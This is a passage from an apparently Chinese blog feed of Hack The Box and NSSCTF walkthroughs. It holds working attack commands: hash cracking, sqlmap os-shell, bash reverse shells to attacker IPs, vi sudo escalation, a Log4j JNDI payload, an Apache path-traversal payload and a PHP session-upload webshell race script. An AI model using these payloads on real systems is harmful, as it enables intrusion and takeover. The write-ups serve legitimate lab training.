class="code"><pre><span class="line">john -wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230408155800420.png" alt="image-20230408155800420"></p><p>然后得出解码的密码是<strong>741852963</strong></p><p>然后就去查看源码</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: dashboard.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span> &gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MegaCorp Login&lt;/title&gt;</span><br><span class="line">  &lt;link href=<span class="string">&quot;https://fonts.googleapis.com/css?family=Open+Sans:400,700&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./style.css&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">  &lt;h1 align=center&gt;MegaCorp Login&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- partial:index.partial.html --&gt;</span><br><span class="line">&lt;body <span class="class"><span class="keyword">class</span>=&quot;<span class="title">align</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">grid</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">action</span>=&quot;&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span> <span class="title">login</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form__field</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">login__username</span>&quot;&gt;&lt;<span class="title">svg</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;<span class="title">use</span> <span class="title">xmlns</span>:<span class="title">xlink</span>=&quot;<span class="title">http</span>://<span class="title">www</span>.<span class="title">w3</span>.<span class="title">org</span>/1999/<span class="title">xlink</span>&quot; <span class="title">xlink</span>:<span class="title">href</span>=&quot;#<span class="title">user</span>&quot;&gt;&lt;/<span class="title">use</span>&gt;&lt;/<span class="title">svg</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">login__username</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">class</span>=&quot;<span class="title">form__input</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form__field</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">login__password</span>&quot;&gt;&lt;<span class="title">svg</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;<span class="title">use</span> <span class="title">xmlns</span>:<span class="title">xlink</span>=&quot;<span class="title">http</span>://<span class="title">www</span>.<span class="title">w3</span>.<span class="title">org</span>/1999/<span class="title">xlink</span>&quot; <span class="title">xlink</span>:<span class="title">href</span>=&quot;#<span class="title">lock</span>&quot;&gt;&lt;/<span class="title">use</span>&gt;&lt;/<span class="title">svg</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">login__password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">form__input</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form__field</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Sign</span> <span class="title">In</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  &lt;<span class="title">svg</span> <span class="title">xmlns</span>=&quot;<span class="title">http</span>://<span class="title">www</span>.<span class="title">w3</span>.<span class="title">org</span>/2000/<span class="title">svg</span>&quot; <span class="title">class</span>=&quot;<span class="title">icons</span>&quot;&gt;&lt;<span class="title">symbol</span> <span class="title">id</span>=&quot;<span class="title">arrow</span>-<span class="title">right</span>&quot; <span class="title">viewBox</span>=&quot;0 0 1792 1792&quot;&gt;&lt;<span class="title">path</span> <span class="title">d</span>=&quot;<span class="title">M1600</span> 960<span class="title">q0</span> 54-37 91<span class="title">l</span>-651 651<span class="title">q</span>-39 37-91 37-51 0-90-37<span class="title">l</span>-75-75<span class="title">q</span>-38-38-38-91<span class="title">t38</span>-91<span class="title">l293</span>-293<span class="title">H245q</span>-52 0-84.5-37.5<span class="title">T128</span> 1024<span class="title">V896q0</span>-53 32.5-90.5<span class="title">T245</span> 768<span class="title">h704L656</span> 474<span class="title">q</span>-38-36-38-90<span class="title">t38</span>-90<span class="title">l75</span>-75<span class="title">q38</span>-38 90-38 53 0 91 38<span class="title">l651</span> 651<span class="title">q37</span> 35 37 90<span class="title">z</span>&quot;/&gt;&lt;/<span class="title">symbol</span>&gt;&lt;<span class="title">symbol</span> <span class="title">id</span>=&quot;<span class="title">lock</span>&quot; <span class="title">viewBox</span>=&quot;0 0 1792 1792&quot;&gt;&lt;<span class="title">path</span> <span class="title">d</span>=&quot;<span class="title">M640</span> 768<span class="title">h512V576q0</span>-106-75-181<span class="title">t</span>-181-75-181 75-75 181<span class="title">v192zm832</span> 96<span class="title">v576q0</span> 40-28 68<span class="title">t</span>-68 28<span class="title">H416q</span>-40 0-68-28<span class="title">t</span>-28-68<span class="title">V864q0</span>-40 28-68<span class="title">t68</span>-28<span class="title">h32V576q0</span>-184 132-316<span class="title">t316</span>-132 316 132 132 316<span class="title">v192h32q40</span> 0 68 28<span class="title">t28</span> 68<span class="title">z</span>&quot;/&gt;&lt;/<span class="title">symbol</span>&gt;&lt;<span class="title">symbol</span> <span class="title">id</span>=&quot;<span class="title">user</span>&quot; <span class="title">viewBox</span>=&quot;0 0 1792 1792&quot;&gt;&lt;<span class="title">path</span> <span class="title">d</span>=&quot;<span class="title">M1600</span> 1405<span class="title">q0</span> 120-73 189.5<span class="title">t</span>-194 69.5<span class="title">H459q</span>-121 0-194-69.5<span class="title">T192</span> 1405<span class="title">q0</span>-53 3.5-103.5<span class="title">t14</span>-109<span class="title">T236</span> 1084<span class="title">t43</span>-97.5 62-81 85.5-53.5<span class="title">T538</span> 832<span class="title">q9</span> 0 42 21.5<span class="title">t74</span>.5 48 108 48<span class="title">T896</span> 971<span class="title">t133</span>.5-21.5 108-48 74.5-48 42-21.5<span class="title">q61</span> 0 111.5 20<span class="title">t85</span>.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5<span class="title">zm</span>-320-893<span class="title">q0</span> 159-112.5 271.5<span class="title">T896</span> 896 624.5 783.5 512 512<span class="title">t112</span>.5-271.5<span class="title">T896</span> 128<span class="title">t271</span>.5 112.5<span class="title">T1280</span> 512<span class="title">z</span>&quot;/&gt;&lt;/<span class="title">symbol</span>&gt;&lt;/<span class="title">svg</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!-- <span class="title">partial</span> --&gt;</span></span><br><span class="line"><span class="class">  </span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>ftp服务器上的压缩包给了源码   源码里面有了账号和密码但是密码是md5加密过的，那我们就尝试进行md5解密查看一下</p><p><img src="../images/image-20230408160129305.png" alt="image-20230408160129305"></p><p>查到密码，尝试进行网站登录</p><p><img src="../images/image-20230408160208170.png" alt="image-20230408160208170"></p><p>成功登录</p><p><strong>其实这个密码就是个弱口令    然后它输入密码的时候没有进行限制，我们其实可以抓包然后爆破他的密码</strong></p><p><img src="../images/image-20230408160429553.png" alt="image-20230408160429553"></p><p>它这个url存在一个类似sql注入的玩意   所以我们还是可以进行sql注入一下</p><p>加了个单引号就很不争气的露出马脚了,以前讲过报错注入,但是我们最终的目的是获取一定权限,那就要用到 <code>--os-shell</code> 了</p><p><img src="../images/image-20230408160608750.png" alt="image-20230408160608750"></p><p>简单的查询爆出了sql语句  更加说明了存在sql注入了</p><p>那么我们就直接上sqlmap了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.129.247.81/dashboard.php?search=1 --cookie=&quot;PHPSESSID=e3ip6sjdos4nrjq6qcoi3vs2k4&quot; --os-shell</span><br></pre></td></tr></table></figure><p>这里的话必须得加上cookie不让获取不成功</p><p>因为它的权限也很低,我连看文件都看不了,继续用 <code>bash</code> 命令连 <code>nc</code></p><p><img src="../images/image-20230408161800060.png" alt="image-20230408161800060"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 443</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.6/443 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230408161903638.png" alt="image-20230408161903638"></p><p>成功把shell弹过来了</p><p>然后就进行文件的查看</p><p><img src="../images/image-20230408162756772.png" alt="image-20230408162756772"></p><p><img src="../images/image-20230408162735318.png" alt="image-20230408162735318"></p><p>发现数据库的账号密码</p><p>然后由于这里扫端口的时候没发现有数据库的端口</p><p>于是就猜测是不是ssh的端口的账号密码</p><p><img src="../images/image-20230408163006747.png" alt="image-20230408163006747"></p><p>果然是，登录成功</p><p><img src="../images/image-20230408163030228.png" alt="image-20230408163030228"></p><p>拿到user的root,那还有root用户的，所以我们就尝试进行提权</p><p><strong>sudo -l    ———》    -l 显示出自己（执行 sudo 的使用者）的权限</strong></p><p><img src="../images/image-20230408163253349.png" alt="image-20230408163253349"></p><p>发现此用户 /bin/vi 处理/etc/postgresql/11/main/pg_hba.conf 具有root权限</p><p>所以就使用vi来进行提权</p><p>我们可以以 <code>root</code> 权限编辑 <code>pg_hba.conf</code> 文件,输入下面语句,分两次编辑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br><span class="line">:set shell=/bin/sh     :wq 保存退出</span><br><span class="line">:shell                 回车</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230408165233922.png" alt="image-20230408165233922"></p><p>这里给我折腾了好久，是写入<strong>:set shell=/bin/sh</strong>，然后在编辑wq处那输入shell</p><p><strong>这里这个提权和suid那个差不多</strong></p><h2 id="Unified-java-Log4j-CVE-202144228"><a href="#Unified-java-Log4j-CVE-202144228" class="headerlink" title="Unified(java - Log4j CVE-202144228)"></a>Unified(java - Log4j CVE-202144228)</h2><p>考点</p><p><img src="../images/image-20230408170926892.png" alt="image-20230408170926892"></p><p>现ping一下<img src="../images/image-20230408171010357.png" alt="image-20230408171010357"></p><p>接下来就是端口扫描了(这里扫的太慢了，就直接拿别人扫的端口来用了)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">6789/tcp open  ibm-db2-admin?</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">8443/tcp open  ssl/nagios-nsca Nagios NSCA</span><br></pre></td></tr></table></figure><p>就是这些常规的端口</p><p>SSH 登录尝试失败，6789 端口是 <a href="https://so.csdn.net/so/search?q=db2&amp;spm=1001.2101.3001.7020">db2</a> 数据库的管理端口，8080 端口是个代理转发端口，访问会重定向到 8443 端口是 UniFi 6.5.54 产品的页面，发现该版本存在 <strong>CVE-2021-44228 漏洞</strong></p><p><img src="../images/image-20230409161734932.png" alt="image-20230409161734932"></p><p>然后发现这个版本的unifi存在漏洞，就是上面写的CVE漏洞   直接搜就能搜出这个CVE</p><p><strong>漏洞复现</strong></p><p>尝试复现 CVE-2021-44228，曾经风靡一时的漏洞 <code>Apache log4j</code>，这是 java 比较常用的日志监控组件</p><p>原理就是我们创建一个恶意服务，服务器请求执行，达到控制的目的，以<code>rmi</code>为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMI是Java的一组拥护开发 分布式应用程序 的 API 。 RMI使用Java语言 接口 定义了远程对象，它集合了Java序列化和Java远程方法协议 (Java Remote Method Protocol)。 简单地说，这样使原先的程序在同一操作系统的方法调用，变成了不同操作系统之间程序的方法调用</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409163952178.png" alt="image-20230409163952178"></p><p>怎么证明的看这篇文章，这里我就不写了  ——-&gt;   <a href="https://blog.csdn.net/qq_40927195/article/details/128811787?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168102784016800213096118%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168102784016800213096118&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-128811787-null-null.142^v82^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=htb%20unified&amp;spm=1018.2226.3001.4187">文章</a></p><p>证明了漏洞存在，接下来进行漏洞的exp利用</p><p><strong>ldap 轻量级目录访问协议，默认端口389，如果存在漏洞发送payload消息，会发送数据报文到本机389端</strong></p><p><strong>漏洞利用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">准备工具：</span><br><span class="line">1.openjdk-11-jdk</span><br><span class="line">sudo apt-get install openjdk-11-jdk -y </span><br><span class="line">2.Maven</span><br><span class="line">sudo apt-get install maven -y</span><br><span class="line">3.编译maven</span><br><span class="line">git clone https://github.com/veracode-research/rogue-jndi</span><br><span class="line">cd rogue-jndi </span><br><span class="line">mvn package</span><br><span class="line">rogue-jndi：开启本机ldap服务，允许接收其他服务器数据，可执行代码</span><br></pre></td></tr></table></figure><p>准备<code>payload</code>，输出<code>base64</code>编码</p><p><strong>反弹shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;bash -c bash -i &gt;&amp;/dev/tcp/10.10.16.24/4444 0&gt;&amp;1&#x27; |base64 </span><br><span class="line">YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjQvNDQ0NCAwPiYxCg==</span><br></pre></td></tr></table></figure><p>搭建 <code>ldap</code> 服务器，传递 <code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/RogueJndi-1.1.jar --command &quot;bash -c &#123;echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjQvNDQ0NCAwPiYxCg==&#125;|</span><br><span class="line">&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; --hostname &quot;&#123;10.10.16.24&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409165256890.png" alt="image-20230409165256890"></p><p><strong>监听4444端口</strong></p><p><img src="../images/image-20230409165154264.png" alt="image-20230409165154264"></p><p><strong>进行发包</strong></p><p><img src="../images/image-20230409165324463.png" alt="image-20230409165324463"></p><p>因为弹shell死活弹不成功    所以就直接看wp就行了</p><p>wp来看这篇就行了       <a href="https://blog.csdn.net/weixin_51392885/article/details/127849252?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168102784016800213096118%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168102784016800213096118&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-127849252-null-null.142^v82^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=htb%20unified&amp;spm=1018.2226.3001.4187">文章</a></p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
      
      
      
        <tags>
            
            <tag> htb 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-CMS刷题记录</title>
      <link href="/posts/746c3a8a.html"/>
      <url>/posts/746c3a8a.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nssctf-web-刷题记录</title>
      <link href="/posts/92a60629.html"/>
      <url>/posts/92a60629.html</url>
      
        <content type="html"><![CDATA[<h2 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><p><strong>这里的考点是put方法</strong></p><p>题目</p><p><img src="../images/image-20230323195811854.png" alt="image-20230323195811854"></p><p>就这点东西，然后我们去信息收集，扫一下目录啥的，然后啥也没扫到</p><p>最后是利用<strong>nikto</strong>这个工具才发现的考点   <a href="https://zhuanlan.zhihu.com/p/124246499">nikto工具的介绍</a></p><p><img src="../images/image-20230323200125587.png" alt="image-20230323200125587"></p><p>发现可以使用put方法，这个方法就是可以直接写内容到自定义的文件里</p><p><img src="../images/image-20230323200345772.png" alt="image-20230323200345772"></p><p>这里就发现1.php创建成功了</p><p>然后就成功写入shell，然后就直接去rce就行了</p><p><strong>学到了个新的知识点了</strong></p><h2 id="NSSRound-4-SWPU-ez-rce"><a href="#NSSRound-4-SWPU-ez-rce" class="headerlink" title="[NSSRound#4 SWPU]ez_rce"></a>[NSSRound#4 SWPU]ez_rce</h2><p>考点</p><p><strong>CVE-2021-41773</strong></p><p><a href="https://blog.csdn.net/weixin_45260839/article/details/125113167">CVE-2021-41773(42013) Apache HTTP Server路径穿越漏洞复现</a></p><p><img src="../images/image-20230324192225432.png" alt="image-20230324192225432"></p><p><strong>payload</strong></p><p>bp  —&gt;  POST发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230324192317206.png" alt="image-20230324192317206"></p><p>因为这里的话flag藏的有点深，直接查找不出来所以就得利用grep命令</p><h2 id="NSSRound-8-Basic-MyDoor"><a href="#NSSRound-8-Basic-MyDoor" class="headerlink" title="[NSSRound#8 Basic]MyDoor"></a>[NSSRound#8 Basic]MyDoor</h2><p>考点</p><p><img src="../images/image-20230324192432327.png" alt="image-20230324192432327"></p><p>这里的话题目的url给了url/index.php?file=  然后就猜一下伪协议，然后拿到源码，然后直接rce就行，在env里</p><h2 id="NSSRound-8-Basic-MyPage"><a href="#NSSRound-8-Basic-MyPage" class="headerlink" title="[NSSRound#8 Basic]MyPage"></a>[NSSRound#8 Basic]MyPage</h2><p>考点</p><p><img src="../images/image-20230324193048319.png" alt="image-20230324193048319"></p><p>题目</p><p><img src="../images/image-20230327172616273.png" alt="image-20230327172616273"></p><p>还是文件包含(只不过这里的话是直接用php为协议是用不了的)</p><p><img src="../images/image-20230327172750597.png" alt="image-20230327172750597"></p><p><img src="../images/image-20230327175508778.png" alt="image-20230327175508778"></p><p><strong>还有一个是pearcmd文件包含</strong></p><p>上面大概就是文件包含的思路了</p><p><strong>方法1</strong></p><p>session文件包含(show里面也有)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading  <span class="comment"># 多线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cffi.backend_ctypes <span class="keyword">import</span> xrange</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://43.143.7.127:28242/&#x27;</span></span><br><span class="line">file = <span class="string">&#x27;ph0ebus.txt&#x27;</span>  <span class="comment"># 上传文件名</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)  <span class="comment"># 文件内容，插入大量垃圾字符来使返回的时间更久，这样临时文件保存的时间更长</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(target, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>index.php?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cat index.php&#x27;);&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]retry&quot;</span>)</span><br><span class="line">            <span class="comment"># print(resp.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):  <span class="comment"># 每次调用返回其中的一个值，内存空间使用极少，因而性能非常好</span></span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">            <span class="comment"># target：在run方法中调用的可调用对象，即需要开启线程的可调用对象，比如函数或方法；args：在参数target中传入的可调用对象的参数元组，默认为空元组()</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>方法二</strong></p><p>用上面的脚本把题目源码给整出来了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span 